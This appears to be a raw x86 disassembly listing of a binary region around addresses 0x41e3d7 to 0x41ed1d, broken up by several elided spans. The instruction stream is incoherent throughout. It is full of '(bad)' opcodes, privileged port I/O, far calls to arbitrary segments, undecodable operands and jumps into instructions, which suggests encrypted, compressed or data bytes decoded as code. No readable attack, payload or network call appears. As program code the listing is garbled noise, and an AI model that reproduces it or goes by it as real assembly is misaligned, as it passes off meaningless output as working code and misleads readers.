  41e3d7:	lods   eax,DWORD PTR ds:[esi]
  41e3d8:	int3   
  41e3d9:	ins    DWORD PTR es:[edi],dx
  41e3da:	push   edx
  41e3db:	js     0x41e3d4
  41e3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3de:	jne    0x41e3ac
  41e3e0:	test   ebx,edi
  41e3e2:	(bad)  
  41e3e3:	int3   
  41e3e4:	jb     0x41e3ae
  41e3e6:	dec    ebp
  41e3e7:	xor    ebp,DWORD PTR [eax]
  41e3e9:	in     al,dx
  41e3ea:	xor    ah,dl
  41e3ec:	inc    ebp
  41e3ed:	mov    ch,0xcc
  41e3ef:	arpl   WORD PTR [ecx+0x5c1ce3f],cx
  41e3f5:	mov    bh,0xa5
  41e3f7:	(bad)  
  41e3f8:	pop    ebx
  41e3f9:	and    ebp,DWORD PTR [edx]
  41e3fb:	add    BYTE PTR [edi],cl
  41e3fd:	inc    edi
  41e3fe:	jl     0x41e3ff
  41e400:	sub    dl,BYTE PTR [ecx]
  41e402:	js     0x41e399
  41e404:	int    0xd3
  41e406:	test   eax,0xbd9c4cf6
  41e40b:	in     eax,dx
  41e40c:	scas   al,BYTE PTR es:[edi]
  41e40d:	pop    ss
  41e40e:	push   ds
  41e40f:	test   DWORD PTR [edi-0x6666ed15],eax
  41e415:	dec    edx
  41e416:	xchg   esp,eax
  41e417:	sub    al,0xf
  41e419:	mov    ?,WORD PTR [edx]
  41e41b:	call   0xfefe:0x7177dfe6
  41e422:	pop    ds
  41e423:	popf   
  41e424:	xor    al,0xa3
  41e426:	or     DWORD PTR [esp+ebx*1],edi
  41e429:	sbb    dh,BYTE PTR [eax+0x4ac094da]
  41e42f:	add    ah,bh
  41e431:	repz ficom WORD PTR [ebx+0x1006ad4]
  41e438:	sbb    eax,0x5a7f00b4
  41e43d:	adc    ah,BYTE PTR [ecx]
  41e43f:	xchg   esp,esi
  41e441:	cdq    
  41e442:	rcr    BYTE PTR [ecx-0x33],0x29
  41e446:	imul   dh
  41e448:	ins    BYTE PTR es:[edi],dx
  41e449:	repnz fstp TBYTE PTR [ecx]
  41e44c:	add    bh,dh
  41e44e:	gs jmp 0x7a8e:0xde9e742
  41e456:	push   0x55
  41e458:	test   eax,0x436a7c6
  41e45d:	inc    eax
  41e45e:	cmp    BYTE PTR [ebx+0x43],bl
  41e461:	inc    edx
  41e462:	inc    ebp
  41e463:	xchg   ebp,eax
  41e464:	popf   
  41e465:	add    al,0x2e
  41e467:	xor    BYTE PTR [ebp+0x53744864],al
  41e46d:	shr    BYTE PTR [esi+ecx*2+0x13],cl
  41e471:	inc    ebx
  41e472:	sbb    BYTE PTR [edx],ah
  41e474:	ins    DWORD PTR es:[edi],dx
  41e475:	cmp    bl,bl
  41e477:	xchg   ecx,eax
  41e478:	sub    eax,0x44365e42
  41e47d:	sbb    BYTE PTR [edi+ebp*8-0x62],al
  41e481:	jge    0x41e47c
  41e483:	bnd je 0x41e40d
  41e486:	pop    edi
  41e487:	test   eax,0x37a91ed9
  41e48c:	mov    WORD PTR [ebp+0x3559a30e],ss
  41e492:	dec    edi
  41e493:	pusha  
  41e494:	sub    eax,0xc46ec040
  41e499:	jp     0x41e504
  41e49b:	mov    esi,DWORD PTR ds:0x76272593
  41e4a1:	and    ch,BYTE PTR [ecx-0x60ea7488]
  41e4a7:	outs   dx,BYTE PTR ds:[esi]
  41e4a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4a9:	(bad)  
  41e4aa:	in     eax,dx
  41e4ab:	(bad)  [edx-0x3eaaec6]
  41e4b1:	mov    bh,0xe8
  41e4b3:	mov    ebx,0x6
	...
  41e514:	add    BYTE PTR [eax],al
  41e516:	and    BYTE PTR [edx-0x35],ch
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	xchg   edi,eax
  41e523:	stos   BYTE PTR es:[edi],al
  41e524:	out    dx,al
  41e525:	(bad)  
  41e527:	inc    eax
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    ah,bl
  41e52f:	pop    ebp
  41e530:	mov    esp,0xe95b8481
  41e535:	icebp  
  41e536:	fstp   QWORD PTR [ebp-0xd472ca3]
  41e53c:	mov    ah,0xc9
  41e53e:	xor    dh,BYTE PTR [edx-0x335b217f]
  41e544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e545:	sub    eax,0xc478581a
  41e54a:	iret   
  41e54b:	sar    DWORD PTR [eax+0x61],1
  41e54e:	js     0x41e5ad
  41e550:	into   
  41e551:	jae    0x41e554
  41e553:	jo     0x41e501
  41e555:	pop    edi
  41e556:	(bad)  
  41e557:	fxch   st(1)
  41e559:	sbb    eax,0x57fbd8d3
  41e55e:	fnsave [eax+0x12]
  41e561:	adc    al,0x1f
  41e563:	rcl    DWORD PTR [ebp+eiz*2-0x3676eb0d],cl
  41e56a:	fucomp st(2)
  41e56c:	xchg   esi,esi
  41e56e:	das    
  41e56f:	ret    0xcc24
  41e572:	inc    DWORD PTR [edi]
  41e574:	fs push edi
  41e576:	mov    al,ds:0x18fb0481
  41e57b:	and    BYTE PTR [eax-0x17bf9eca],dl
  41e581:	loopne 0x41e547
  41e583:	arpl   WORD PTR [edx+edi*8-0x68],sp
  41e587:	inc    eax
  41e588:	mov    dl,0x48
  41e58a:	xchg   ebp,eax
  41e58b:	xlat   BYTE PTR ds:[ebx]
  41e58c:	mov    eax,ds:0xb348bb76
  41e591:	xor    eax,0x455dffd0
  41e596:	test   DWORD PTR [eax],edx
  41e598:	dec    ebx
  41e599:	push   ebp
  41e59a:	loope  0x41e572
  41e59c:	in     eax,0x13
  41e59e:	push   edx
  41e59f:	mov    BYTE PTR [edi-0x4c8f592b],dh
  41e5a5:	fild   DWORD PTR [ebx-0x6efb4a31]
  41e5ab:	jp     0x41e56d
  41e5ad:	sub    eax,0x44029bfb
  41e5b2:	mov    ch,dl
  41e5b4:	xchg   edx,eax
  41e5b5:	lds    ecx,FWORD PTR [ecx+0x6e]
  41e5b8:	popf   
  41e5b9:	mov    dh,0x1f
  41e5bb:	mov    esi,0xcc4cc9b3
  41e5c0:	loopne 0x41e635
  41e5c2:	pop    edx
  41e5c3:	mov    bl,dh
  41e5c5:	mov    WORD PTR [esp+ecx*1-0x22a13392],es
  41e5cc:	sar    BYTE PTR [esi+ebx*1],cl
  41e5cf:	jmp    0x8bdf8f23
  41e5d4:	xor    BYTE PTR [ecx+0x62],al
  41e5d7:	div    edi
  41e5d9:	jnp    0x41e607
  41e5db:	in     eax,0x13
  41e5dd:	add    BYTE PTR [ecx+0x65],ah
  41e5e0:	mov    ebx,0xbcc62fb5
  41e5e5:	addr16 pop ds
  41e5e7:	call   FWORD PTR [edx-0x13]
  41e5ea:	js     0x41e572
  41e5ec:	or     DWORD PTR [edx+0x9e61a3d],edi
  41e5f2:	mov    ds:0xc4ce89d2,eax
  41e5f7:	or     BYTE PTR [ecx-0x1ab975e2],bl
  41e5fd:	jb     0x41e63d
  41e5ff:	adc    eax,0x72496775
  41e604:	push   0x35
  41e606:	loopne 0x41e5c2
  41e608:	cmp    al,0xa8
  41e60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e60b:	or     al,0x5d
  41e60d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e60e:	and    eax,0x8bfcc8fe
  41e613:	call   0xaaca:0xc7a8ba17
  41e61a:	xor    DWORD PTR [eax+0x561a71eb],esi
  41e620:	leave  
  41e621:	scas   al,BYTE PTR es:[edi]
  41e622:	or     BYTE PTR [ecx-0x40d2f60d],dh
  41e628:	retf   
  41e629:	aaa    
  41e62a:	or     eax,0xa3b78e9e
  41e62f:	jne    0x41e5b2
  41e631:	std    
  41e632:	adc    dl,al
  41e634:	das    
	...
  41e695:	add    ch,al
  41e697:	cwde   
  41e698:	loope  0x41e6ef
  41e69a:	std    
  41e69b:	jge    0x41e692
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0xdf8b3d55,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    BYTE PTR [eax-0x44],ch
  41e6b0:	in     al,dx
  41e6b1:	pop    esp
  41e6b2:	test   eax,0xda030818
  41e6b7:	push   cs
  41e6b8:	sbb    al,0xf8
  41e6ba:	ficom  WORD PTR [ebp-0x3e]
  41e6bd:	xor    al,0xe9
  41e6bf:	sbb    DWORD PTR [eax],0xffffffec
  41e6c2:	jae    0x41e680
  41e6c4:	sti    
  41e6c5:	aas    
  41e6c6:	into   
  41e6c7:	rcl    ebx,cl
  41e6c9:	xchg   edi,eax
  41e6ca:	cwde   
  41e6cb:	sar    BYTE PTR [edi+0x2b],cl
  41e6ce:	dec    ebx
  41e6cf:	out    0x4c,al
  41e6d1:	cld    
  41e6d2:	test   eax,0x3a76ac8c
  41e6d7:	add    BYTE PTR [ecx+0x6f9a8809],al
  41e6dd:	pop    eax
  41e6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6df:	arpl   bp,bp
  41e6e1:	loope  0x41e69d
  41e6e3:	pusha  
  41e6e4:	(bad)  
  41e6e5:	xor    ah,dh
  41e6e7:	mov    fs,ebx
  41e6e9:	out    dx,al
  41e6ea:	aad    0x24
  41e6ec:	in     eax,dx
  41e6ed:	mov    dl,cl
  41e6ef:	pop    edi
  41e6f0:	jmp    0xcb5f326a
  41e6f5:	push   esi
  41e6f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6f7:	fist   DWORD PTR [esi+0x12]
  41e6fa:	mov    al,0x52
  41e6fc:	jecxz  0x41e727
  41e6fe:	adc    DWORD PTR [edi],esp
  41e700:	out    dx,al
  41e701:	sbb    dl,BYTE PTR [edx]
  41e703:	das    
  41e704:	mov    BYTE PTR [esi+0x668cd1eb],cl
  41e70a:	inc    eax
  41e70b:	in     eax,0xa1
  41e70d:	sub    DWORD PTR [eax-0x10db827a],edx
  41e713:	xchg   edi,eax
  41e714:	mov    ecx,0x5461c37f
  41e719:	stos   BYTE PTR es:[edi],al
  41e71a:	jge    0x41e6b3
  41e71c:	inc    esi
  41e71d:	icebp  
  41e71e:	mov    bh,0x4b
  41e720:	je     0x41e6d7
  41e722:	dec    esi
  41e724:	push   ds
  41e725:	in     al,0xf6
  41e727:	shl    DWORD PTR [edx-0x5b9b4788],0xe3
  41e72e:	fistp  WORD PTR [ecx]
  41e730:	ss (bad) 
  41e732:	mov    dh,0x40
  41e734:	dec    esi
  41e735:	xchg   edi,eax
  41e736:	aaa    
  41e737:	mov    ch,0xa9
  41e739:	dec    ebx
  41e73a:	mov    bh,0x99
  41e73c:	sbb    ch,ch
  41e73e:	or     ebp,DWORD PTR fs:[eax-0x1dfe1333]
  41e745:	dec    edi
  41e746:	push   0xffffff82
  41e748:	mov    bh,0xb9
  41e74a:	xchg   BYTE PTR [eax+0x69],dl
  41e74d:	inc    esp
  41e74e:	les    edi,FWORD PTR [ebx-0x1da58b4b]
  41e754:	add    al,0xb3
  41e756:	addr16 push cs
  41e758:	pop    edi
  41e759:	les    ecx,FWORD PTR [ebx]
  41e75b:	ja     0x41e6e8
  41e75d:	push   edi
  41e75e:	or     eax,0xd5c2c397
  41e763:	xchg   ebx,eax
  41e764:	jp     0x41e749
  41e766:	cmp    al,0x6
  41e768:	retf   
  41e769:	mov    eax,ds:0x10685088
  41e76e:	mov    ds:0x3d21bd84,eax
  41e773:	sti    
  41e774:	popf   
  41e775:	rcr    DWORD PTR [ebx-0x583c12ae],0x9d
  41e77c:	in     eax,0x47
  41e77e:	dec    edi
  41e77f:	add    dh,BYTE PTR [edi+0x42]
  41e782:	xchg   edx,eax
  41e783:	sbb    eax,0xf17ce0bd
  41e788:	pop    eax
  41e789:	ret    0xcab4
  41e78c:	cmp    esi,DWORD PTR [edx-0x46]
  41e78f:	test   BYTE PTR [ebp-0xe],ah
  41e792:	int3   
  41e793:	add    al,0x70
  41e795:	stc    
  41e796:	stos   DWORD PTR es:[edi],eax
  41e797:	fnstsw WORD PTR [esi-0x3e]
  41e79a:	sub    DWORD PTR [eax],ebx
  41e79c:	cmp    al,0x17
  41e79e:	adc    BYTE PTR [ecx-0x45],bh
  41e7a1:	mov    dh,0x3
  41e7a3:	dec    edx
  41e7a4:	push   ebx
  41e7a5:	pop    ebx
  41e7a6:	add    al,0x4
  41e7a8:	es sub al,0x45
  41e7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ac:	dec    eax
  41e7ad:	pop    edx
  41e7ae:	ins    DWORD PTR es:[edi],dx
  41e7af:	mov    bh,0x15
  41e7b1:	xor    al,0xb0
  41e7b3:	dec    ecx
  41e7b4:	cmp    al,BYTE PTR [eax]
	...
  41e816:	sub    eax,0x9e5c8a39
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0xffffff87
  41e823:	mov    bh,0x25
  41e825:	sub    eax,DWORD PTR [ebx+eax*2]
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    BYTE PTR [esi-0x5a204863],ah
  41e833:	xchg   ebp,eax
  41e834:	scas   al,BYTE PTR es:[edi]
  41e835:	pop    esp
  41e836:	sub    eax,ebx
  41e838:	jge    0x41e848
  41e83a:	jo     0x41e824
  41e83c:	shl    DWORD PTR [ebx],cl
  41e83e:	sbb    bl,BYTE PTR [esi+edx*4]
  41e841:	fadd   DWORD PTR [esi+edi*4+0x401a6770]
  41e848:	(bad)
  41e84b:	retf   
  41e84c:	pop    ds
  41e84d:	out    0x20,eax
  41e84f:	inc    ebp
  41e850:	xchg   ebp,ecx
  41e852:	mov    al,0x2b
  41e854:	(bad)  
  41e855:	lods   eax,DWORD PTR ds:[esi]
  41e856:	xchg   ebx,eax
  41e857:	mov    ebx,0x2bd95465
  41e85c:	push   edx
  41e85d:	(bad)  
  41e85f:	adc    bl,BYTE PTR [eax]
  41e861:	dec    esi
  41e862:	inc    edi
  41e863:	inc    ecx
  41e864:	push   ebx
  41e865:	nop
  41e866:	aaa    
  41e867:	push   ebp
  41e868:	cmp    esp,DWORD PTR ss:[edx-0x69a3e9d]
  41e86f:	xchg   edi,eax
  41e870:	clc    
  41e871:	mov    WORD PTR [edi-0x48],?
  41e874:	add    eax,DWORD PTR [ebp+eiz*8+0x54]
  41e878:	dec    eax
  41e879:	push   ecx
  41e87a:	push   ebx
  41e87b:	out    dx,eax
  41e87c:	jle    0x41e8cd
  41e87e:	add    DWORD PTR [eax+0x2a],edi
  41e881:	sub    al,0xba
  41e883:	jp     0x41e8eb
  41e885:	bound  esp,QWORD PTR [ebx+0x75]
  41e888:	dec    ecx
  41e889:	nop
  41e88a:	les    esi,FWORD PTR [esi+0x41]
  41e88d:	jae    0x41e866
  41e88f:	and    eax,0xe04c96df
  41e894:	pop    eax
  41e895:	sti    
  41e896:	shr    BYTE PTR [edx-0x67],cl
  41e899:	jo     0x41e8dd
  41e89b:	outs   dx,BYTE PTR ds:[esi]
  41e89c:	jno    0x41e829
  41e89e:	xchg   esp,eax
  41e89f:	into   
  41e8a0:	(bad)  
  41e8a1:	fldenv [edi-0x85d2e91]
  41e8a7:	and    al,0x84
  41e8a9:	pop    ecx
  41e8aa:	lock xchg ecx,eax
  41e8ac:	dec    ebp
  41e8ad:	in     al,dx
  41e8ae:	shl    eax,cl
  41e8b0:	jnp    0x41e84f
  41e8b2:	or     bh,ah
  41e8b4:	cmp    esi,DWORD PTR [ecx]
  41e8b6:	sub    DWORD PTR [ecx+0x46],ecx
  41e8b9:	sub    al,0x2e
  41e8bb:	xor    al,0x44
  41e8bd:	jp     0x41e8c9
  41e8bf:	or     dh,dh
  41e8c1:	mov    eax,ds:0x4e8803c6
  41e8c6:	lds    edx,FWORD PTR [ebx+ecx*1+0x40]
  41e8ca:	xlat   BYTE PTR ds:[ebx]
  41e8cb:	jbe    0x41e929
  41e8cd:	dec    ebp
  41e8ce:	inc    eax
  41e8cf:	push   es
  41e8d0:	adc    BYTE PTR [eax+0x4f],al
  41e8d3:	cmp    bh,al
  41e8d5:	fs push esp
  41e8d7:	xor    dh,BYTE PTR [ebx+0x42]
  41e8da:	push   ebx
  41e8db:	dec    ebp
  41e8dc:	jmp    0x6ebfdedd
  41e8e1:	(bad)  
  41e8e2:	mov    dh,0x3
  41e8e4:	mov    cl,0xeb
  41e8e6:	jmp    0x41e8d8
  41e8e8:	in     al,dx
  41e8e9:	mov    al,ds:0xfc0ff907
  41e8ee:	out    0xa3,al
  41e8f0:	mov    esp,0x67b78f59
  41e8f5:	xor    eax,DWORD PTR [edi+0x5f]
  41e8f8:	lock mov eax,ds:0xe7ed1b76
  41e8fe:	mov    edi,0x5c908056
  41e903:	jge    0x41e924
  41e905:	sub    bl,ah
  41e907:	adc    cl,BYTE PTR [esi]
  41e909:	xchg   ecx,eax
  41e90a:	sahf   
  41e90b:	jp     0x41e8a3
  41e90d:	fmul   DWORD PTR [esi]
  41e90f:	clc    
  41e910:	aas    
  41e911:	ffree  st(6)
  41e913:	das    
  41e914:	push   ds
  41e915:	out    0xf9,al
  41e917:	(bad)  
  41e918:	jmp    0x41e8c8
  41e91a:	pop    es
  41e91b:	push   edi
  41e91c:	clc    
  41e91d:	add    al,cl
  41e91f:	cmc    
  41e920:	cli    
  41e921:	sub    DWORD PTR [edi+0x26],eax
  41e924:	cmp    DWORD PTR [ebx+0x409f2009],ecx
  41e92a:	repnz mov es:0x707f35c6,eax
  41e931:	mov    ecx,0x2e13ba
	...
  41e996:	js     0x41e995
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	inc    ebp
  41e9a3:	sub    BYTE PTR [esi],dh
  41e9a5:	mov    ebx,0x1440b
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    bl,bl
  41e9af:	adc    cl,0x9d
  41e9b2:	cs cmp ah,dh
  41e9b5:	pop    es
  41e9b6:	and    DWORD PTR [edx],0x5b
  41e9b9:	shl    bh,1
  41e9bb:	sbb    BYTE PTR [ebx-0x7e],0x50
  41e9bf:	mov    edx,0x100a294b
  41e9c4:	xlat   BYTE PTR ds:[ebx]
  41e9c5:	mov    edx,0x4ec0742a
  41e9ca:	les    edi,FWORD PTR [ebx]
  41e9cc:	nop
  41e9cd:	xchg   DWORD PTR [edi-0x25],eax
  41e9d0:	and    cl,BYTE PTR [ebx]
  41e9d2:	aas    
  41e9d3:	fidivr DWORD PTR [ebx]
  41e9d5:	test   ah,al
  41e9d7:	xor    ecx,ebx
  41e9d9:	fist   DWORD PTR [edi]
  41e9db:	loopne 0x41e971
  41e9dd:	or     al,0x4a
  41e9df:	mov    ds:0xf1e981ed,eax
  41e9e4:	enter  0xaa29,0x7a
  41e9e8:	(bad)  
  41e9e9:	lods   al,BYTE PTR ds:[esi]
  41e9ea:	dec    ebp
  41e9eb:	sbb    edi,DWORD PTR [eax]
  41e9ed:	outs   dx,DWORD PTR ds:[esi]
  41e9ee:	push   es
  41e9ef:	jmp    0x41e993
  41e9f1:	fist   DWORD PTR [esi]
  41e9f3:	pop    edx
  41e9f4:	repnz addr16 xchg edi,eax
  41e9f7:	sbb    al,dh
  41e9f9:	test   al,0xa8
  41e9fb:	mov    cl,0x1a
  41e9fd:	sbb    DWORD PTR [edx],edi
  41e9ff:	mov    cl,0x90
  41ea01:	mov    cl,0x88
  41ea03:	retf   
  41ea04:	cwde   
  41ea05:	call   FWORD PTR [edi+0x39b163a9]
  41ea0b:	hlt    
  41ea0c:	sub    BYTE PTR [eax],bh
  41ea0e:	pop    ebx
  41ea0f:	and    DWORD PTR [ecx+0x627b1b89],ebx
  41ea15:	jno    0x41e9a2
  41ea17:	xchg   ecx,eax
  41ea18:	push   ss
  41ea19:	add    BYTE PTR [ebp-0x49],cl
  41ea1c:	xlat   BYTE PTR ds:[ebx]
  41ea1d:	jmp    0x41ea32
  41ea1f:	jo     0x41ea20
  41ea21:	repz out 0x8f,eax
  41ea24:	mov    edi,0x813abb8d
  41ea29:	fwait
  41ea2a:	mov    al,ds:0x7dd1f682
  41ea2f:	repnz mov ss,WORD PTR [edi-0x23]
  41ea33:	repnz mov ebp,0xbf47ac74
  41ea39:	dec    ebx
  41ea3a:	push   ds
  41ea3b:	inc    esi
  41ea3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea3d:	repz and cl,0xde
  41ea41:	aam    0x73
  41ea43:	fld    DWORD PTR [ecx+0x7d]
  41ea46:	lahf   
  41ea47:	and    cl,al
  41ea49:	jb     0x41ea6d
  41ea4b:	cld    
  41ea4c:	inc    esi
  41ea4d:	and    BYTE PTR [edi],ch
  41ea4f:	cs pop ss
  41ea51:	xlat   BYTE PTR ds:[ebx]
  41ea52:	add    eax,0xae508b9e
  41ea57:	loopne 0x41ea85
  41ea59:	push   ss
  41ea5a:	xor    BYTE PTR [edx-0x1c070ac3],ch
  41ea60:	sub    edi,DWORD PTR [edx+0x50]
  41ea63:	not    BYTE PTR [eax]
  41ea65:	addr16 pusha 
  41ea67:	cmp    al,0xa5
  41ea69:	push   edx
  41ea6a:	fidivr DWORD PTR [edi]
  41ea6c:	sbb    BYTE PTR [edx],dh
  41ea6e:	out    dx,eax
  41ea6f:	sbb    dl,BYTE PTR [esp+eiz*2+0x376a4186]
  41ea76:	ret    0x632b
  41ea79:	jbe    0x41ea90
  41ea7b:	sbb    BYTE PTR [eax],al
  41ea7d:	or     eax,0x2ec3de99
  41ea82:	fadd   DWORD PTR [ecx]
  41ea84:	inc    ecx
  41ea85:	ja     0x41eb03
  41ea87:	cmp    DWORD PTR [ebp-0x2b],edi
  41ea8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea8b:	xor    al,0x43
  41ea8d:	dec    esi
  41ea8e:	xor    ah,ch
  41ea90:	(bad)  
  41ea91:	mov    BYTE PTR [eax-0x73],ch
  41ea94:	repz inc edx
  41ea96:	dec    ebp
  41ea97:	fs xchg ebx,eax
  41ea99:	fnstenv fs:[eax-0x13170345]
  41eaa0:	or     al,0xa8
  41eaa2:	jnp    0x41eaad
  41eaa4:	mov    eax,gs:0xf96a9f3b
  41eaaa:	call   0xe4d2:0x2752f0d7
  41eab1:	int3   
  41eab2:	jl     0x41ea45
  41eab4:	mov    es,WORD PTR [eax]
	...
  41eb16:	adc    ch,BYTE PTR [edi]
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fldenv [ecx]
  41eb23:	xchg   ecx,eax
  41eb24:	mov    ds:0x1451297,eax
  41eb29:	add    BYTE PTR [edi],al
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [edi],cl
  41eb2f:	xor    al,0x7
  41eb31:	or     esi,DWORD PTR [edx-0x4a]
  41eb34:	add    esp,edx
  41eb36:	jmp    0x41eb33
  41eb38:	pop    esi
  41eb39:	jae    0x41ebb5
  41eb3b:	mov    BYTE PTR [esi+0x1d],al
  41eb3e:	(bad)  
  41eb40:	push   0x8dc6a52b
  41eb45:	or     al,0x4
  41eb47:	push   DWORD PTR [ebp-0x6b14a4a1]
  41eb4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb4e:	arpl   WORD PTR [edx-0x4d],cx
  41eb51:	and    bl,bl
  41eb53:	aaa    
  41eb54:	push   ecx
  41eb55:	inc    BYTE PTR [ebp-0x4c]
  41eb58:	out    0xb1,al
  41eb5a:	push   0x7a
  41eb5c:	inc    eax
  41eb5d:	add    ecx,DWORD PTR [edx-0x1fc706d8]
  41eb63:	jmp    0xa4fb:0x2cb4e9ab
  41eb6a:	fcom   DWORD PTR ds:0xaee4231f
  41eb70:	aas    
  41eb71:	inc    edi
  41eb72:	push   edx
  41eb73:	pop    ebx
  41eb74:	je     0x41eba2
  41eb76:	fst    DWORD PTR [ecx+0x6ec2ef7f]
  41eb7c:	cmp    eax,0xc6cce528
  41eb81:	ret    
  41eb82:	push   0x7264a8d8
  41eb87:	xor    dl,BYTE PTR [edi+0x0]
  41eb8a:	loopne 0x41eb92
  41eb8c:	push   esi
  41eb8d:	fldcw  WORD PTR ds:0x2fdda28b
  41eb93:	test   BYTE PTR ds:0x9baf6f7e,ah
  41eb99:	sub    DWORD PTR [ecx+0x56722e9a],esi
  41eb9f:	xchg   edx,esp
  41eba1:	sub    BYTE PTR fs:[eax],dh
  41eba4:	push   esp
  41eba5:	add    ah,0xc2
  41eba8:	js     0x41ebef
  41ebaa:	mov    dh,0x7e
  41ebac:	sub    edi,esi
  41ebae:	les    eax,FWORD PTR [esi-0x4a]
  41ebb1:	aam    0xf8
  41ebb3:	dec    ebx
  41ebb4:	mov    edx,0x33f1730b
  41ebb9:	push   ds
  41ebba:	ds mov ch,0xc2
  41ebbd:	nop
  41ebbe:	inc    ebp
  41ebbf:	into   
  41ebc0:	adc    edi,ebx
  41ebc2:	pop    ebp
  41ebc3:	and    DWORD PTR [eax+0x59],esi
  41ebc6:	fisubr DWORD PTR [eax-0x3f]
  41ebc9:	or     eax,0x22890fc4
  41ebcf:	sub    DWORD PTR [edx],eax
  41ebd1:	int    0xc9
  41ebd3:	fwait
  41ebd4:	inc    edi
  41ebd5:	arpl   dx,ax
  41ebd7:	pushf  
  41ebd8:	add    al,0x21
  41ebda:	xchg   BYTE PTR [esi],al
  41ebdc:	cdq    
  41ebdd:	in     al,0x3b
  41ebdf:	mov    WORD PTR [ebp+0x473c4b57],cs
  41ebe5:	ret    
  41ebe6:	into   
  41ebe7:	xor    dh,BYTE PTR [ecx-0x53bb6cf7]
  41ebed:	jns    0x41ebbe
  41ebef:	jmp    0x9e09d679
  41ebf4:	xchg   esp,eax
  41ebf5:	int    0xc1
  41ebf7:	ficom  DWORD PTR [eax]
  41ebf9:	jae    0x41ec24
  41ebfb:	ds stc 
  41ebfd:	add    BYTE PTR [edx+0x1a],ch
  41ec00:	leave  
  41ec01:	sub    BYTE PTR cs:[edx],cl
  41ec04:	push   ebp
  41ec05:	call   0xe26f:0x5e5132ae
  41ec0c:	dec    edx
  41ec0d:	push   ss
  41ec0e:	aad    0xc9
  41ec10:	out    dx,eax
  41ec11:	nop
  41ec12:	inc    esp
  41ec13:	shl    BYTE PTR [edx+0x62],cl
  41ec16:	outs   dx,DWORD PTR ds:[esi]
  41ec17:	mov    dl,0x9b
  41ec19:	mov    bl,0xe
  41ec1b:	cld    
  41ec1c:	mov    ds:0x201bcf70,al
  41ec21:	cmp    al,BYTE PTR ds:0xfe770e7c
  41ec27:	fs add eax,0xe4efd5c2
  41ec2d:	or     al,0x6
  41ec2f:	sar    DWORD PTR [edx-0x6dca6b79],1
	...
  41ec95:	add    BYTE PTR [ecx-0xf],al
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	pop    ebp
  41eca3:	xor    DWORD PTR [ecx],ecx
  41eca5:	out    dx,eax
  41eca6:	sbb    DWORD PTR [esi+0x1],eax
  41eca9:	add    BYTE PTR [edi],al
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [esi+ebp*1+0x35],ch
  41ecb1:	mov    ds:0x4e4cd30b,eax
  41ecb6:	push   esp
  41ecb7:	dec    cl
  41ecb9:	into   
  41ecba:	ds jmp 0x41ecab
  41ecbd:	xchg   BYTE PTR gs:[ecx-0x35],bl
  41ecc1:	cmc    
  41ecc2:	push   ecx
  41ecc3:	mov    DWORD PTR [edi],esp
  41ecc5:	inc    ecx
  41ecc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc8:	fs pop eax
  41ecca:	jno    0x41ecea
  41eccc:	dec    ebx
  41eccd:	adc    eax,edi
  41eccf:	ins    BYTE PTR es:[di],dx
  41ecd1:	xor    BYTE PTR [eax],al
  41ecd3:	mov    ah,ch
  41ecd5:	call   0x12a9:0xfde79e1d
  41ecdc:	pop    ds
  41ecdd:	pop    es
  41ecde:	pop    esi
  41ecdf:	hlt    
  41ece0:	(bad)  
  41ece1:	sahf   
  41ece2:	call   0x3288:0x21b6b435
  41ece9:	sub    eax,0x6f58e7cc
  41ecee:	jbe    0x41ecf2
  41ecf0:	push   es
  41ecf1:	loope  0x41ed25
  41ecf3:	out    dx,eax
  41ecf4:	in     al,0x94
  41ecf6:	adc    eax,0x56bc209c
  41ecfb:	xchg   edx,edx
  41ecfd:	inc    ecx
  41ecfe:	push   ds
  41ecff:	into   
  41ed00:	adc    ebx,DWORD PTR [edx]
  41ed02:	push   0xffffffdb
  41ed04:	jl     0x41ec8e
  41ed06:	call   edx
  41ed08:	retf   
  41ed09:	pop    ebx
  41ed0a:	shl    ecx,1
  41ed0c:	(bad)  
  41ed0d:	lods   eax,DWORD PTR ds:[esi]
  41ed0e:	push   ebp
  41ed0f:	xchg   BYTE PTR [esi-0x6c],ch
  41ed12:	scas   eax,DWORD PTR es:[edi]
  41ed13:	jb     0x41ecbc
  41ed15:	addr16 inc ecx
  41ed17:	test   eax,0xadaf941f
  41ed1c:	out    dx,eax
  41ed1d:	into   
